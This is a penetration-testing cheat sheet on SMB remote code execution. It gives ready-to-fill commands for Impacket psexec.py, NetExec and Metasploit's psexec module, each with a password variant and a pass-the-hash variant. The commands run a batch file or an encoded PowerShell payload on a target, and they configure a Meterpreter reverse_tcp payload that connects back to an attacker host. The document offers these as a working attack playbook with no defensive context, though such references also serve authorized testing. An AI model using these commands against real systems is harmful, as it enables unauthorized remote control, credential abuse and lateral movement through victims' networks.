# SMB

## 01 - Impacket

- Authenticate via username and password

`$ psexec.py <domain_name>/<username>:<password>@<IP> -c shell.bat`

- Authenticate via Pass The Hash

`$ psexec.py <domain_name>/<username>@<IP> -hashes <LM>:<NT> -c shell.bat`

## 02 - NetExec

- Authenticate via username and password

`$ netexec smb <IP> -u <username> -d <domain_name> -p <password> -x shell.bat`

`$ netexec smb <IP> -u <username> -d <domain_name> -p <password> -x "powershell -E <base64_payload>"`

- Authenticate via Pass The Hash

`$ netexec smb <IP> -u <username> -d <domain_name> -H <NT> -x shell.bat`

`$ netexec smb <IP> -u <username> -d <domain_name> -H <NT> -x "powershell -E <base64_payload>"`

## 03 - Metasploit

- Authenticate via username and password

```
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/psexec) > set lhost <attacker_IP>

msf exploit(windows/smb/psexec) > set lport <PORT>

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set smbdomain <domain_name>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password>

msf exploit(windows/smb/psexec) > run
```

- Authenticate via Pass The Hash

```
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/psexec) > set lhost <attacker_IP>

msf exploit(windows/smb/psexec) > set lport <PORT>

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set smbdomain <domain_name>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:<nt_hash>

msf exploit(windows/smb/psexec) > run
```